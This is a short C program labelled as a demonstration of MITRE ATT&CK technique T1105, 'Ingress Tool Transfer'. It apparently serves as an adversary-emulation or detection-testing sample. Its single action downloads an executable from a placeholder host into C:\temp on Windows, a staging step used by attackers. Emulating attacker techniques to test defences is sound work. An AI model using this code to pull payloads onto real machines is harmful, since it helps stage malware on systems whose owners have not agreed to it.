// Link      = https://attack.mitre.org/techniques/T1105/
// Technique = Ingress Tool Transfer
// ID        = T1105
// Tactics   = Command and Control,

#include <windows.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

#define URL_TO_DOWNLOAD "http://www.xyz.abc/x.exe"
#define PATH_TO_DOWNLOAD "C:\\temp\\x.exe"

int main() {
    URLDownloadToFileA(NULL, URL_TO_DOWNLOAD, PATH_TO_DOWNLOAD, 0, NULL);
    return 0;
}

